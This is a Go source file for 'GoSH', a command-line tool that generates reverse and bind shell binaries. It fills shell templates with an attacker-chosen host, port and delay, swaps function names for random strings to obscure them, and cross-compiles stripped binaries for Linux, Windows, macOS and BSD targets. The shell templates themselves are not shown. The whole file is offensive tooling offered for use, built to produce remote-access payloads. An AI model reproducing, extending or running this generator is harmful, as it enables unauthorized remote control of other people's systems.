package main
import (
    "github.com/fatih/color"
    "github.com/akamensky/argparse"
	"github.com/gobuffalo/packr"
    "net"
    "math/rand"
    "time"
    "strings"
    "os/exec"
    "fmt"
    "io"
    "os"
    "github.com/common-nighthawk/go-figure"
)

func print_good(msg string){
    color.Green("[+] %s", msg)
}

func print_info(msg string){
    fmt.Println("[*]", msg)
}

func print_error(msg string){
    color.Red("[x] %s", msg)
}

func write_to_file(filename string, data string) error {
    file, err := os.Create(filename)
    if err != nil {
        return err
    }
    defer file.Close()
    _, err = io.WriteString(file, data)
    if err != nil {
        return err
    }
    return file.Sync()
}

func get_local_ip() string {
    conn, _ := net.Dial("udp", "8.8.8.8:80")
    defer conn.Close()
    ip := conn.LocalAddr().(*net.UDPAddr).IP
    return fmt.Sprintf("%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3])
}

func file_size(file string) string{
    f, err := os.Open(file)
    exit_on_error("[FILE ERROR]", err)
    defer f.Close()
    stat, err := f.Stat()
    var bytes int64
    bytes = stat.Size()
    var kilobytes int64
    kilobytes = (bytes / 1024) 
    var megabytes float64
    megabytes = (float64)(kilobytes / 1024)
    if kilobytes < 1024{
        return fmt.Sprintf("%d KB", kilobytes)
    } else {
        return fmt.Sprintf("%v MB", megabytes)
    }
}

func print_banner(){
    banner := figure.NewFigure("GoSH", "", true)
    color.Set(color.FgCyan, color.Bold)
    banner.Print()
    color.Unset()
    fmt.Println("")
}

func exit_on_error(message string, err error){
    if err != nil{
        color.Red(message)
        fmt.Println(err)
        os.Exit(0)
    }
}

func random_string(n int) string{
    rand.Seed(time.Now().UnixNano())
    var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
    b := make([]rune, n)
    for i := range b {
        b[i] = letters[rand.Intn(len(letters))]
    }
    return string(b)
}

func random_int() int{
    rand.Seed(time.Now().UnixNano())
    return rand.Intn(10 - 4) + 4
}

type Generator struct{
    host string
    port string
    shell_type string
    delay string
    platform string
    arch string
    name string
    shrink bool 
    print_source bool
    udp bool
}
func (self Generator) generate() string{
    func_names_to_replace := []string{"FUNC_DELETE", "FUNC_HANDLE", "FUNC_SLEEP"}
    template, err := packr.NewBox("./templates/").FindString(self.shell_type+".go")
    exit_on_error("[PACKR ERROR]", err)
    conn_type := "tcp"
    if self.udp {
        conn_type = "udp"
    }
    template = strings.Replace(template, "HOST", self.host, -1)
    template = strings.Replace(template, "PORT", self.port, -1)
    template = strings.Replace(template, "SECONDS", self.delay, -1)
    template = strings.Replace(template, "CONN_TYPE", conn_type, -1)
    for func_name := range func_names_to_replace{
        pattern := func_names_to_replace[func_name]
        template = strings.Replace(template, pattern, random_string(random_int()), -1)
    }
    if self.print_source {
        color.Set(color.Bold)
        fmt.Println(template)
        color.Unset()
    }
    return template
}
func (self Generator) compile(template string){
    write_to_file("final.go", template)
    ld_flags := ""
    if (self.shrink){
        ld_flags = "-w -s"
    }
    out, err := exec.Command("env", fmt.Sprintf("GOOS=%s", self.platform),
                            fmt.Sprintf("GOARCH=%s", self.arch),
                            "go", "build", "-o", self.name,
                             "-ldflags", ld_flags, "final.go").Output()
    if string(out) != "" {
	    fmt.Println("[*] Build message: ", out)
    }
    exit_on_error("[BUILD ERROR]", err)

}
func (self Generator) summary(){
    exec.Command("sh", "rm", "final.go") 
    print_good(fmt.Sprintf("Compiled binary: %s (size: %s)", self.name, file_size(self.name)))
}

func main(){
    print_banner()
    color.Set(color.Bold)
    fmt.Println("-- GOLANG REVERSE/BIND SHELL GENERATOR --")
    color.Unset()
    fmt.Println("")
    parser := argparse.NewParser("gosh", "")
    var OUT *string = parser.String("o", "out", &argparse.Options{Required: false, Default: "shell_out", Help: "Name of the generated binary"})
    var PLATFORM *string = parser.Selector("p", "platform", []string{"darwin", "linux", "windows", "netbsd", "openbsd", "solaris", "freebsd"}, 
                            &argparse.Options{Required: false, Default: "linux", Help: "Platform to target"})
    var ARCH *string = parser.Selector("a", "arch", []string{"386", "amd64", "arm", "arm64", "ppc64"}, 
                            &argparse.Options{Required: false, Default: "386", Help: "Architecture to target"})
    var HOST *string = parser.String("H", "host", &argparse.Options{Required: false, Default: get_local_ip(), Help: "Host to bind or connect to"})
    var PORT *string = parser.String("P", "port", &argparse.Options{Required: false, Default: "4444", Help: "Port to bind or connect to"})
    var TYPE *string = parser.Selector("t", "type", []string{"bind", "reverse"}, &argparse.Options{Required: true, Help: "Type of the shell to generate"})
    var UDP *bool = parser.Flag("u", "udp", &argparse.Options{Required: false, Help: "Use UDP instead of TCP connection"})
    var LDFLAGS *bool = parser.Flag("l", "ldflags", &argparse.Options{Required: false, Help: "Use '-w -c' ldflags for size reduction"})
    var DELAY *string = parser.String("d", "delay", &argparse.Options{Required: false, Default: "0", Help: "Number of seconds to wait before shell execution"})
    var PRINT *bool = parser.Flag("", "print", &argparse.Options{Required: false, Help: "Print source code of the generated binary for debugging purpose"})
	err := parser.Parse(os.Args)
    exit_on_error("[PARSER ERROR]", err)

    generator := new(Generator)
    generator.name = *OUT
    generator.platform = *PLATFORM
    generator.arch = *ARCH
    generator.shrink = *LDFLAGS
    generator.delay = *DELAY
    generator.host = *HOST
    generator.port = *PORT
    generator.shell_type = *TYPE
    generator.udp = *UDP
    generator.print_source = *PRINT
    final_template := generator.generate()
    generator.compile(final_template)
    generator.summary()
}
